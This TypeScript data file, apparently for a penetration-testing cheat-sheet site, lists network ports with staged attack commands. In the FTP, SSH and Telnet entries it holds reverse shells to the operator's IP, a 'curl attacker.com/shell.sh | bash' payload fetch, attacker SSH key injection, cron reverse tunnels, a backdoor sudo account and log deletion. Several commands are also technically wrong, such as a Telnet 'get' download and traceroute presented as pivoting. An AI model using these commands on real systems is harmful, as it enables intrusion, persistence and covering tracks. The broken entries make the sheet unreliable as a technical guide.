export interface PortInfo {
  port: number;
  service: string;
  description: string;
  defaultState: 'open' | 'closed' | 'filtered';
  common: boolean;
  protocol: 'tcp' | 'udp' | 'both';
  commands?: [string, string][];
  // added for navigation
  id: string;
  title: string;
  path: string;
  // added for staged sections
  sections: {
    id: string;
    title: string;
    content?: string;
    commands: [string, string][];
  }[];
}

export const commonPorts: PortInfo[] = [
  {
    port: 21,
    service: 'FTP',
    description: 'File Transfer Protocol - Used for transferring files between systems. Frequently misconfigured with anonymous access or weak credentials.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-21',
    title: 'FTP (21)',
    path: '/ports/21',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        content: 'Essential FTP commands for initial access and quick file operations, including anonymous login and credential testing.',
        commands: [
          ['ftp [IP]', 'Connect using built-in FTP client'],
          ['nc -vn [IP] 21', 'Grab FTP banner with netcat'],
          ['telnet [IP] 21', 'Connect manually to test commands'],
          ['nmap -p21 -sV [IP]', 'Version detection'],
          ['nmap -p21 --script=ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor [IP]', 'Run NSE scripts for common FTP issues'],
          ['hydra -L users.txt -P rockyou.txt ftp://[IP]', 'Brute force FTP login'],
          ['curl ftp://[IP] --user anonymous:anonymous', 'Connect and list files'],
          ['wget -m ftp://anonymous:anonymous@[IP]', 'Recursively mirror all accessible files'],
          ['lftp -u anonymous,anonymous [IP]', 'Connect using more advanced client'],
          ['echo open [IP] > ftp.txt && echo user anonymous anonymous >> ftp.txt && echo dir >> ftp.txt && echo bye >> ftp.txt && ftp -n < ftp.txt', 'Scripted login and file listing']
        ]
      },
      {
        id: 'Footprinting',
        title: 'Footprinting',
        content: 'Early-stage reconnaissance commands to discover FTP service presence and gather banner information for version identification.',
        commands: [
          ['nmap -p21 [IP]', 'Detect if port is open'],
          ['nc -vn [IP] 21', 'Check response & grab banner'],
          ['telnet [IP] 21', 'Quick test of service banner'],
          ['ftp [IP]', 'Try connecting and watch server banner'],
          ['nmap -sV -p21 [IP]', 'Identify service/version info'],
          ['p0f [IP]', 'Passive fingerprinting (if traffic captured)']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        content: 'Techniques to enumerate users or directories via FTP, testing login mechanisms and directory listings.',
        commands: [
          ['nmap --script=ftp-anon,ftp-syst -p21 [IP]', 'Check for anonymous login and system info'],
          ['ftp [IP] → USER anonymous', 'Manual anonymous login test'],
          ['ftp [IP] → HELP', 'List available commands (can expose server type)'],
          ['curl -v ftp://[IP] --user anonymous:anonymous', 'Verbose output for connection behavior'],
          ['telnet [IP] 21 → USER anonymous', 'Manual banner interaction'],
          ['lftp [IP]', 'Enumerate directories with `ls -al`'],
          ['nmap --script=ftp-bounce -p21 [IP]', 'Check if server is vulnerable to FTP bounce'],
          ['onesixtyone [IP]', 'Test SNMP-based FTP info (if also open)'],
          ['enum4linux -u anonymous -p anonymous -a [IP]', 'If on Windows system, might reveal share info']
        ]
      },
      {
        id: 'Exploitation',
        title: 'Exploitation',
        content: 'Actions taken to exploit FTP misconfigurations, such as anonymous downloads or poorly secured credentials.',
        commands: [
          ['hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://[IP]', 'Dictionary attack on FTP'],
          ['medusa -h [IP] -u admin -P rockyou.txt -M ftp', 'Alternative bruteforce tool'],
          ['ftp [IP] → put shell.php', 'Upload a PHP reverse shell (if writeable)'],
          ['wget -m ftp://[IP]', 'Mirror all files with anonymous or known creds'],
          ['msfconsole → use exploit/unix/ftp/proftpd_133c_backdoor', 'ProFTPD 1.3.3c backdoor RCE'],
          ['msfconsole → use exploit/windows/ftp/3cdaemon_ftp_user', 'Exploit for 3CDaemon FTP'],
          ['exploit/windows/ftp/slftpd_list_traversal', 'Directory traversal vulnerability'],
          ['exploit/unix/ftp/ftp_user_enum', 'Enumerate valid FTP usernames'],
          ['nmap -p21 --script=ftp-vsftpd-backdoor [IP]', 'Check for known vsftpd backdoor']
        ]
      },
      {
        id: 'Post-Exploitation',
        title: 'Post-Exploitation',
        content: 'Follow-up activities after FTP access, like retrieving sensitive files or pivoting through downloaded data.',
        commands: [
          ['ftp [IP] → put reverse_shell.sh', 'Upload reverse shell if write is allowed'],
          ['echo "nc -e /bin/bash [YOUR IP] 4444" > shell.sh && ftp put shell.sh', 'Drop and execute shell'],
          ['Check directories: /etc/, /home/, /var/www', 'Look for creds or pivot opportunities'],
          ['exiftool [downloaded file]', 'Check metadata in downloaded files'],
          ['strings [filename]', 'Extract readable content from downloaded files'],
          ['grep -i password [filename]', 'Search for passwords in retrieved files']
        ]
      },
      {
        id: 'Persistence',
        title: 'Persistence (if writeable)',
        content: 'Persistence techniques to maintain long-term FTP access, such as uploading backdoor scripts to the server’s startup directories, placing malicious cron-enabled scripts via FTP, and configuring recurring file transfers to re-establish connections automatically.',
        commands: [
          ['Upload cronjob via writable /etc (rare)', 'Establish recurring access'],
          ['Modify startup scripts (if writable)', 'Persist on reboot'],
          ['echo "bash -i >& /dev/tcp/[YOUR IP]/4444 0>&1" >> .bashrc', 'Backconnect shell on user login'],
          ['echo "@reboot root /tmp/shell.sh" | crontab -', 'Create cron-based persistence']
        ]
      }
    ]
  }
  ,
  {
    port: 22,
    service: 'SSH',
    description: 'Secure Shell – Encrypted remote administration protocol. Widely used for secure remote logins, file transfers, and tunneling.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-22',
    title: 'SSH (22)',
    path: '/ports/22',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        content: 'Basic SSH operations for establishing connections, specifying custom ports, copying files, and debugging.',
        commands: [
          ['ssh user@[IP]', 'Connect to SSH server with default settings'],
          ['ssh -p 2222 user@[IP]', 'Connect to a non-standard port'],
          ['ssh -i key.pem user@[IP]', 'Connect using a specific private key file'],
          ['scp file.txt user@[IP]:/remote/path', 'Securely copy a file to the remote host'],
          ['sftp user@[IP]', 'Interactive file transfer session'],
          ['ssh -v user@[IP]', 'Verbose output for troubleshooting'],
          ['ssh -o StrictHostKeyChecking=no user@[IP]', 'Skip host key verification (useful in scripts)'],
          ['ssh -C user@[IP]', 'Enable compression to speed up slow links']
        ]
      },
      {
        id: 'Footprinting',
        title: 'Footprinting',
        content: 'Initial reconnaissance to confirm SSH service, grab version and cipher details, and fingerprint the server implementation.',
        commands: [
          ['nmap -p22 [IP]', 'Check if SSH port is open'],
          ['nmap -sV -p22 [IP]', 'Service/version detection'],
          ['nc -vn [IP] 22', 'Banner grab to see SSH server version'],
          ['ssh-keyscan [IP]', 'Retrieve and display host public key(s)'],
          ['ssh -vvv user@[IP]', 'Ultra-verbose handshake details (key exchange, ciphers)'],
          ['nmap --script ssh2-enum-algos -p22 [IP]', 'Enumerate supported SSH algorithms'],
          ['p0f -i eth0 tcp and port 22', 'Passive OS and SSH fingerprinting (if monitoring traffic)']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        content: 'Techniques to enumerate valid user accounts, supported authentication methods, and weak configurations.',
        commands: [
          ['hydra -L users.txt -P passwords.txt ssh://[IP]', 'Brute-force SSH login attempts'],
          ['patator ssh_login host=[IP] user=FILE0 password=FILE1 0=users.txt 1=passwords.txt', 'Brute-force with Patator for fine-grained control'],
          ['nmap --script ssh-auth-methods -p22 [IP]', 'List supported authentication methods (password, key, keyboard-interactive)'],
          ['sshpass -p password ssh user@[IP]', 'Non-interactive password login using sshpass'],
          ['nmap --script ssh-brute -p22 [IP]', 'Nmap’s SSH brute-force script'],
          ['ssh -o PreferredAuthentications=none user@[IP]', 'Probe which auth methods are allowed'],
          ['msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS [IP]; run"', 'Metasploit SSH user enumeration (CVE-2018-15473)'],
          ['enum4linux -a [IP]', 'Gather SMB/SSH information on Windows hosts'],
          ['crowbar -b ssh -s [IP] -U users.txt -C passwords.txt', 'Multithreaded SSH brute forcing with Crowbar']
        ]
      },
      {
        id: 'Exploitation',
        title: 'Exploitation',
        content: 'Exploiting weak SSH configurations or known vulnerabilities to gain unauthorized shell access or code execution.',
        commands: [
          ['msfconsole -q -x "use exploit/linux/ssh/sshexec; set RHOSTS [IP]; set USERNAME root; set PASSWORD password; run"', 'Exploit SSH exec if vulnerable credentials known'],
          ['ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 user@[IP]', 'Force legacy cipher if weak algorithm fallback exists'],
          ['ssh -R 4444:localhost:4444 user@[IP]', 'Reverse SSH tunnel to bypass firewall restrictions'],
          ['proxychains ssh user@[IP]', 'Route SSH traffic through proxy for stealth'],
          ['sshuttle -r user@[IP] 0/0', 'Create a VPN-like tunnel for network pivoting']
        ]
      },
      {
        id: 'Post-Exploitation',
        title: 'Post-Exploitation',
        content: 'Actions after gaining SSH access: file exfiltration, port forwarding, persistence setup, and lateral movement.',
        commands: [
          ['scp user@[IP]:/etc/passwd ./passwd', 'Download sensitive files for offline analysis'],
          ['ssh -L 5900:localhost:5900 user@[IP]', 'Local port forward VNC port for GUI access'],
          ['ssh -N -f -L 3306:localhost:3306 user@[IP]', 'Tunnel remote MySQL for database access'],
          ['ssh user@[IP] "tmux new -s backdoor"', 'Start persistent shell session inside tmux'],
          ['ssh user@[IP] "curl http://attacker.com/shell.sh | bash"', 'Pull and run a remote payload'],
          ['rsync -avz user@[IP]:/var/www/html ./website_backup', 'Mirror web content for analysis']
        ]
      },
      {
        id: 'Persistence',
        title: 'Persistence',
        content: 'Techniques to maintain SSH backdoors and re-entry points: key injection, cron jobs, and service modifications.',
        commands: [
          ['echo "ssh-rsa AAAAB3... attacker@host" >> ~/.ssh/authorized_keys', 'Inject attacker’s public key for passwordless login'],
          ['sudo cp ~/.ssh/authorized_keys /root/.ssh/', 'Propagate key to root account (requires sudo)'],
          ['echo "@reboot user ssh -N -R 2222:localhost:22 attacker@[YOUR_IP]" | crontab -', 'Automate reverse tunnel on reboot via cron'],
          ['sudo systemctl enable sshd', 'Ensure SSH daemon always starts on boot'],
          ['echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config && sudo systemctl reload sshd', 'Enable root login in SSH config for permanent backdoor']
        ]
      }
    ]
  }
  ,
  {
    port: 23,
    service: 'Telnet',
    description: 'Telnet – Unencrypted remote administration protocol. Commonly misused to capture cleartext credentials and banners.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-23',
    title: 'Telnet (23)',
    path: '/ports/23',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        content: 'Basic Telnet operations for connecting to services, grabbing banners, and manually issuing protocol commands.',
        commands: [
          ['telnet [IP] 23', 'Connect to Telnet service'],
          ['nc [IP] 23', 'Netcat connection and banner grab'],
          ['curl telnet://[IP]:23', 'Use curl to connect and show output'],
          ['nmap -p23 [IP]', 'Check if Telnet port is open'],
          ['nmap -sV -p23 [IP]', 'Service/version detection'],
          ['telnet [IP] 23 < commands.txt', 'Batch script commands from file'],
          ['telnet -8 [IP] 23', 'Force 8-bit connections for extended character sets']
        ]
      },
      {
        id: 'Footprinting',
        title: 'Footprinting',
        content: 'Initial discovery and information gathering: port scans, banner grabs, and passive fingerprinting to identify Telnet versions and device types.',
        commands: [
          ['nmap -p23 --script=banner [IP]', 'Banner grab via NSE banner script'],
          ['nc -vn [IP] 23', 'Netcat banner grab for Telnet'],
          ['telnet [IP] 23', 'Manual connect to view server greeting'],
          ['p0f -i eth0 tcp and port 23', 'Passive OS and application fingerprinting'],
          ['httprint -s telnet-signatures.pat -h [IP]', 'Protocol-specific fingerprinting']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        content: 'Techniques to enumerate users, weak credentials, or open services via Telnet, including brute-forcing and script-based enumeration.',
        commands: [
          ['hydra -L users.txt -P pass.txt telnet://[IP]', 'Brute-force Telnet login'],
          ['patator telnet_login host=[IP] user=FILE0 password=FILE1 0=users.txt 1=pass.txt', 'Patator Telnet brute force'],
          ['nmap -p23 --script telnet-ntlm-info [IP]', 'Extract NTLM challenge info on Windows Telnet'],
          ['nmap -p23 --script telnet-encryption [IP]', 'Check supported Telnet encryption options'],
          ['sec-replay telnet [IP] 23', 'Replay captured Telnet session for analysis'],
          ['expect -c "spawn telnet [IP] 23; expect \\"login:\\"; send \\"anonymous\\r\\"; interact"', 'Automate login with Expect script']
        ]
      },
      {
        id: 'Exploitation',
        title: 'Exploitation',
        content: 'Exploiting weak Telnet configurations or known vulnerabilities to obtain shell access or escalate privileges.',
        commands: [
          ['msfconsole -q -x "use auxiliary/scanner/telnet/telnet_login; set RHOSTS [IP]; set USERPASS_FILE creds.txt; run"', 'Metasploit Telnet brute module'],
          ['echo -e "user anonymous\r\npass anonymous\r\n" | telnet [IP] 23', 'Anonymous login attempt via echo pipeline'],
          ['telnet [IP] 23; open 127.0.0.1 23', 'Telnet bounce through intermediary'],
          ['exploit/linux/telnet/telnetd_backdoor', 'Metasploit backdoor telnetd exploit (if present)'],
          ['rm -rf /var/log/telnetd.log', 'Clean up Telnet logs after compromise']
        ]
      },
      {
        id: 'Post-Exploitation',
        title: 'Post-Exploitation',
        content: 'Actions after gaining Telnet access, such as pivoting, credential harvesting, and file transfers over the established session.',
        commands: [
          ['telnet [IP] 23; get /etc/passwd', 'Download passwd file via built-in get'],
          ['telnet [IP] 23; put shell.sh', 'Upload a shell script for remote execution'],
          ['traceroute -T -p 23 [TARGET]', 'Pivot through compromised host to reach internal targets'],
          ['telnet [IP] 23; ls /home/', 'Enumerate user directories'],
          ['telnet [IP] 23; chmod +x shell.sh; sh shell.sh', 'Set execute and run uploaded script']
        ]
      },
      {
        id: 'Persistence',
        title: 'Persistence',
        content: 'Methods to maintain Telnet-based access, including adding backdoor accounts, modifying startup scripts, and scheduling tasks.',
        commands: [
          ['telnet [IP] 23; useradd backdoor -p $(openssl passwd -1 password)', 'Create a new user with encrypted password'],
          ['telnet [IP] 23; echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers', 'Give backdoor sudo privileges'],
          ['telnet [IP] 23; echo "@reboot root telnetd" >> /etc/crontab', 'Ensure telnetd restarts on reboot via cron'],
          ['telnet [IP] 23; echo "/usr/sbin/in.telnetd" >> /etc/inetd.conf && kill -HUP 1', 'Re-add Telnet service to inetd for persistence']
        ]
      }
    ]
  }
  ,
  {
    port: 25,
    service: 'SMTP',
    description: 'Simple Mail Transfer Protocol - Email routing and delivery.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-25',
    title: 'SMTP (25)',
    path: '/ports/25',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['telnet [IP] 25', 'Test connection'],
          ['smtp-user-enum -M VRFY -U users.txt -t [IP]', 'Enumerate users']
        ]
      },
      {
        id: 'Footprinting',
        title: 'Footprinting',
        commands: [
          ['telnet [IP] 25', 'Banner grab & basic handshake']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        commands: [
          ['smtp-user-enum -M VRFY -U users.txt -t [IP]', 'User enumeration via VRFY']
        ]
      }
    ]
  },
  {
    port: 53,
    service: 'DNS',
    description: 'Domain Name System - Resolves domain names to IP addresses.',
    defaultState: 'open',
    common: true,
    protocol: 'both',
    id: 'port-53',
    title: 'DNS (53)',
    path: '/ports/53',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['dig @[IP] domain.com', 'DNS lookup'],
          ['dig @[IP] domain.com AXFR', 'Zone transfer'],
          ['dnsenum domain.com', 'DNS enumeration']
        ]
      },
      {
        id: 'Footprinting',
        title: 'Footprinting',
        commands: [
          ['dig @[IP] domain.com', 'Identify DNS server config']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        commands: [
          ['dig @[IP] domain.com AXFR', 'Attempt zone transfer'],
          ['dnsenum domain.com', 'Automated DNS record enum']
        ]
      }
    ]
  },
  {
    port: 80,
    service: 'HTTP',
    description: 'Hypertext Transfer Protocol - Web server.',
    defaultState: 'open',
    common: true,
    protocol: 'tcp',
    id: 'port-80',
    title: 'HTTP (80)',
    path: '/ports/80',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['nmap -p80 -sV [IP]', 'Service/version scan'],
          ['gobuster dir -u http://[IP] -w [WORDLIST]', 'Directory enumeration'],
          ['nikto -h [IP]', 'Nikto scan']
        ]
      },
      {
        id: 'Footprinting',
        title: 'Footprinting',
        commands: [
          ['nmap -p80 -sV [IP]', 'Banner & version grab']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        commands: [
          ['gobuster dir -u http://[IP] -w [WORDLIST]', 'Bruteforce directories'],
          ['nikto -h [IP]', 'Vulnerability scan']
        ]
      }
    ]
  },
  {
    port: 88,
    service: 'Kerberos',
    description: 'Network authentication protocol, commonly used in Windows domains.',
    defaultState: 'filtered',
    common: true,
    protocol: 'both',
    id: 'port-88',
    title: 'Kerberos (88)',
    path: '/ports/88',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['kerbrute userenum -d domain.local --dc [IP] users.txt', 'User enumeration'],
          ['kerbrute passwordspray -d domain.local --dc [IP] users.txt Password123', 'Password spraying']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        commands: [
          ['kerbrute userenum -d domain.local --dc [IP] users.txt', 'Enumerate usernames'],
          ['kerbrute passwordspray -d domain.local --dc [IP] users.txt Password123', 'Spray passwords']
        ]
      }
    ]
  },
  {
    port: 110,
    service: 'POP3',
    description: 'Post Office Protocol v3 - Email retrieval.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-110',
    title: 'POP3 (110)',
    path: '/ports/110',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['telnet [IP] 110', 'Basic connection'],
          ['hydra -l user -P pass.txt [IP] pop3', 'Test credentials']
        ]
      }
    ]
  },
  {
    port: 111,
    service: 'RPCBind',
    description: 'Remote Procedure Call port mapper.',
    defaultState: 'open',
    common: true,
    protocol: 'tcp',
    id: 'port-111',
    title: 'RPCBind (111)',
    path: '/ports/111',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['rpcinfo -p [IP]', 'Show RPC services'],
          ['showmount -e [IP]', 'NFS shares']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        commands: [
          ['rpcinfo -p [IP]', 'List RPC endpoints'],
          ['showmount -e [IP]', 'Enumerate NFS exports']
        ]
      }
    ]
  },
  {
    port: 135,
    service: 'MSRPC',
    description: 'Microsoft Remote Procedure Call - Windows service control.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-135',
    title: 'MSRPC (135)',
    path: '/ports/135',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['impacket-rpcdump [IP]', 'Enumerate endpoints'],
          ['rpcclient -U "" -N [IP]', 'Test null session']
        ]
      }
    ]
  },
  {
    port: 139,
    service: 'NetBIOS',
    description: 'NetBIOS Session Service - Windows file and printer sharing.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-139',
    title: 'NetBIOS (139)',
    path: '/ports/139',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['smbclient -L [IP] -N', 'Enumerate shares'],
          ['smbclient \\\\[IP]\\share -N', 'Connect to share']
        ]
      }
    ]
  },
  {
    port: 143,
    service: 'IMAP',
    description: 'Internet Message Access Protocol - Email retrieval.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-143',
    title: 'IMAP (143)',
    path: '/ports/143',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['telnet [IP] 143', 'Basic connection'],
          ['hydra -l user -P pass.txt [IP] imap', 'Test credentials']
        ]
      }
    ]
  },
  {
    port: 389,
    service: 'LDAP',
    description: 'Lightweight Directory Access Protocol - Directory services.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-389',
    title: 'LDAP (389)',
    path: '/ports/389',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['ldapsearch -x -h [IP] -b "dc=example,dc=com"', 'Enumerate users'],
          ['ldapsearch -x -h [IP] -b "" -s base', 'Test null bind']
        ]
      }
    ]
  },
  {
    port: 443,
    service: 'HTTPS',
    description: 'HTTP over SSL/TLS - Secure web server.',
    defaultState: 'open',
    common: true,
    protocol: 'tcp',
    id: 'port-443',
    title: 'HTTPS (443)',
    path: '/ports/443',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['sslscan [IP]', 'SSL scan'],
          ['openssl s_client -connect [IP]:443', 'Certificate info'],
          ['nmap -p 443 --script ssl-heartbleed [IP]', 'Heartbleed test']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        commands: [
          ['sslscan [IP]', 'Enumerate SSL/TLS protocols'],
          ['openssl s_client -connect [IP]:443', 'Grab certificate details']
        ]
      }
    ]
  },
  {
    port: 445,
    service: 'SMB',
    description: 'Server Message Block - Windows file and printer sharing.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-445',
    title: 'SMB (445)',
    path: '/ports/445',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['smbmap -H [IP]', 'Enumerate shares'],
          ['nmap -p445 --script smb-vuln* [IP]', 'Check vulnerabilities'],
          ['smbclient \\\\[IP]\\share -N', 'Connect to share']
        ]
      },
      {
        id: 'Enumeration',
        title: 'Enumeration',
        commands: [
          ['smbmap -H [IP]', 'List available shares'],
          ['nmap -p445 --script smb-vuln* [IP]', 'Detect known SMB vulns']
        ]
      }
    ]
  },
  {
    port: 464,
    service: 'Kerberos',
    description: 'Kerberos password change/set.',
    defaultState: 'filtered',
    common: true,
    protocol: 'both',
    id: 'port-464',
    title: 'Kerberos (464)',
    path: '/ports/464',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['rpcclient -U "user%pass" [IP] -c "changepassword user newpass"', 'Password reset attempt']
        ]
      }
    ]
  },
  {
    port: 587,
    service: 'SMTP',
    description: 'SMTP submission port - Email sending with authentication.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-587',
    title: 'SMTP (587)',
    path: '/ports/587',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['telnet [IP] 587', 'Test connection'],
          ['openssl s_client -starttls smtp -crlf -connect [IP]:587', 'Test StartTLS']
        ]
      }
    ]
  },
  {
    port: 636,
    service: 'LDAPS',
    description: 'LDAP over SSL/TLS - Secure directory services.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-636',
    title: 'LDAPS (636)',
    path: '/ports/636',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['ldapsearch -x -H ldaps://[IP] -b "dc=example,dc=com"', 'Secure LDAP query'],
          ['openssl s_client -connect [IP]:636', 'Test SSL/TLS']
        ]
      }
    ]
  },
  {
    port: 1433,
    service: 'MSSQL',
    description: 'Microsoft SQL Server database.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-1433',
    title: 'MSSQL (1433)',
    path: '/ports/1433',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['sqsh -S [IP] -U sa', 'Connect with sqsh'],
          ['hydra -l sa -P [WORDLIST] [IP] mssql', 'Test credentials']
        ]
      }
    ]
  },
  {
    port: 1521,
    service: 'Oracle',
    description: 'Oracle database server.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-1521',
    title: 'Oracle (1521)',
    path: '/ports/1521',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['odat -s [IP] -p 1521', 'SID enumeration'],
          ['hydra -l system -P [WORDLIST] [IP] oracle-listener', 'Test credentials']
        ]
      }
    ]
  },
  {
    port: 3306,
    service: 'MySQL',
    description: 'MySQL database server.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-3306',
    title: 'MySQL (3306)',
    path: '/ports/3306',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['mysql -h [IP] -u root -p', 'Connect to MySQL'],
          ['hydra -l root -P [WORDLIST] [IP] mysql', 'Test credentials']
        ]
      }
    ]
  },
  {
    port: 3389,
    service: 'RDP',
    description: 'Remote Desktop Protocol - Windows remote access.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-3389',
    title: 'RDP (3389)',
    path: '/ports/3389',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['rdesktop [IP]', 'Connect with rdesktop'],
          ['hydra -l administrator -P [WORDLIST] [IP] rdp', 'Test credentials']
        ]
      }
    ]
  },
  {
    port: 5432,
    service: 'PostgreSQL',
    description: 'PostgreSQL database server.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-5432',
    title: 'PostgreSQL (5432)',
    path: '/ports/5432',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['psql -h [IP] -U postgres', 'Connect to PostgreSQL'],
          ['hydra -l postgres -P [WORDLIST] [IP] postgres', 'Test credentials']
        ]
      }
    ]
  },
  {
    port: 5900,
    service: 'VNC',
    description: 'Virtual Network Computing - Remote desktop access.',
    defaultState: 'filtered',
    common: true,
    protocol: 'tcp',
    id: 'port-5900',
    title: 'VNC (5900)',
    path: '/ports/5900',
    sections: [
      {
        id: 'common-commands',
        title: 'Common Commands',
        commands: [
          ['vncviewer [IP]:5900', 'Connect with vncviewer'],
          ['hydra -P [WORDLIST] [IP] vnc', 'Test credentials']
        ]
      }
    ]
  }
];
